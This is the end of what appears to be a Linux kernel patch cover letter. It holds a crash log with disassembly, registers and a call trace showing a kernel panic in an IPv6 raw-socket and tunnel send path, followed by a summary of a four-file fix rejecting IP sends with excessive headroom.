+[  234.053865] Code: 00 00 00 00 00 48 c7 84 24 a0 00 00 00 00 00 00 00 83 f8 27 0f 8e 9a 0a 00 00 49 63 c6 4c 01 c0 0f 84 7f 01 00 00 49 8b 14 24 <44> 0f b6 48 06 f6 c2 08 74 3c 41 0f b7 54 24 0e 48 8b 48 08 41 bd
+All code
+========
+   0:	00 00                	add    %al,(%rax)
+   2:	00 00                	add    %al,(%rax)
+   4:	00 48 c7             	add    %cl,-0x39(%rax)
+   7:	84 24 a0             	test   %ah,(%rax,%riz,4)
+   a:	00 00                	add    %al,(%rax)
+   c:	00 00                	add    %al,(%rax)
+   e:	00 00                	add    %al,(%rax)
+  10:	00 83 f8 27 0f 8e    	add    %al,-0x71f0d808(%rbx)
+  16:	9a                   	(bad)
+  17:	0a 00                	or     (%rax),%al
+  19:	00 49 63             	add    %cl,0x63(%rcx)
+  1c:	c6                   	(bad)
+  1d:	4c 01 c0             	add    %r8,%rax
+  20:	0f 84 7f 01 00 00    	je     0x1a5
+  26:	49 8b 14 24          	mov    (%r12),%rdx
+  2a:*	44 0f b6 48 06       	movzbl 0x6(%rax),%r9d		<-- trapping instruction
+  2f:	f6 c2 08             	test   $0x8,%dl
+  32:	74 3c                	je     0x70
+  34:	41 0f b7 54 24 0e    	movzwl 0xe(%r12),%edx
+  3a:	48 8b 48 08          	mov    0x8(%rax),%rcx
+  3e:	41                   	rex.B
+  3f:	bd                   	.byte 0xbd
+
+Code starting with the faulting instruction
+===========================================
+   0:	44 0f b6 48 06       	movzbl 0x6(%rax),%r9d
+   5:	f6 c2 08             	test   $0x8,%dl
+   8:	74 3c                	je     0x46
+   a:	41 0f b7 54 24 0e    	movzwl 0xe(%r12),%edx
+  10:	48 8b 48 08          	mov    0x8(%rax),%rcx
+  14:	41                   	rex.B
+  15:	bd                   	.byte 0xbd
+[  234.056808] RSP: 0018:ffffc9000aac75a0 EFLAGS: 00010286
+[  234.057649] RAX: ffff88821e640000 RBX: ffff8881055201c0 RCX: ffffc9000aac76cc
+[  234.058844] RDX: 000000000020105f RSI: 0000000000000000 RDI: 0000000000000000
+[  234.059977] RBP: ffffc9000aac76a0 R08: ffff88821e640000 R09: 0000000000000000
+[  234.061118] R10: 000000000000dd86 R11: ffffc9000aac76cc R12: ffffffff83966000
+[  234.062255] R13: ffffc9000aac7620 R14: 0000000000000000 R15: 0000000000000000
+[  234.063403] FS:  00007e28f9bbd780(0000) GS:ffff88813bd00000(0000) knlGS:0000000000000000
+[  234.064686] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  234.065606] CR2: ffff88821e640006 CR3: 000000011e52a002 CR4: 0000000000770ef0
+[  234.066745] PKRU: 55555554
+[  234.067214] Call Trace:
+[  234.067617]  <TASK>
+[  234.070979]  __xfrm_decode_session (/home/roxy/linux-block-patch/build/../net/xfrm/xfrm_policy.c:3504)
+[  234.071688]  icmpv6_route_lookup (/home/roxy/linux-block-patch/build/../include/net/ip6_route.h:285 /home/roxy/linux-block-patch/build/../net/ipv6/icmp.c:372)
+[  234.072397]  icmp6_send (/home/roxy/linux-block-patch/build/../net/ipv6/icmp.c:686 (discriminator 1))
+[  234.073647]  icmpv6_ndo_send (/home/roxy/linux-block-patch/build/../net/ipv6/ip6_icmp.c:16)
+[  234.074296]  ip6_tnl_start_xmit (/home/roxy/linux-block-patch/build/../net/ipv6/ip6_tunnel.c:1440)
+[  234.074981]  dev_hard_start_xmit (/home/roxy/linux-block-patch/build/../include/linux/netdevice.h:4835 /home/roxy/linux-block-patch/build/../include/linux/netdevice.h:5379 /home/roxy/linux-block-patch/build/../include/linux/netdevice.h:5371 /home/roxy/linux-block-patch/build/../net/core/dev.c:3888 /home/roxy/linux-block-patch/build/../net/core/dev.c:3904)
+[  234.075660]  __dev_queue_xmit (/home/roxy/linux-block-patch/build/../include/linux/netfilter_netdev.h:137 /home/roxy/linux-block-patch/build/../net/core/dev.c:4806)
+[  234.080901]  ip6_finish_output2 (/home/roxy/linux-block-patch/build/../include/net/ipv6.h:738 /home/roxy/linux-block-patch/build/../net/ipv6/ip6_output.c:83)
+[  234.083021]  ip6_finish_output (/home/roxy/linux-block-patch/build/../include/net/dst.h:582 (discriminator 2) /home/roxy/linux-block-patch/build/../net/ipv6/ip6_output.c:235 (discriminator 2))
+[  234.083699]  rawv6_sendmsg (/home/roxy/linux-block-patch/build/../net/ipv6/raw.c:908)
+[  234.086335]  __sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2258)
+[  234.086841]  __x64_sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2268)
+[  234.087453]  do_syscall_64 (/home/roxy/linux-block-patch/build/../include/linux/sched/task_stack.h:23 /home/roxy/linux-block-patch/build/../arch/x86/include/asm/entry-common.h:43 /home/roxy/linux-block-patch/build/../include/linux/irq-entry-common.h:100 /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:174 /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:89)
+[  234.088057]  entry_SYSCALL_64_after_hwframe (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:121)
+[  234.088865] RIP: 0033:0x7e28f9c51687
+[  234.092398] RSP: 002b:00007ffeda544450 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
+[  234.093617] RAX: ffffffffffffffda RBX: 00007e28f9bbd780 RCX: 00007e28f9c51687
+[  234.094763] RDX: 00000000000000c8 RSI: 00007e28f96489b0 RDI: 0000000000000003
+[  234.096853] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
+[  234.099484] CR2: ffff88821e640006
+[  234.099936] ---[ end trace 0000000000000000 ]---
+[  234.111918] Kernel panic - not syncing: Fatal exception in interrupt
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  net: reject IP sends with excessive headroom
+
+ net/ipv4/ip_output.c  | 2 ++
+ net/ipv4/raw.c        | 5 ++++-
+ net/ipv6/ip6_output.c | 4 ++++
+ net/ipv6/raw.c        | 2 ++
+ 4 files changed, 12 insertions(+), 1 deletion(-)
+
+-- 
+2.43.0
+
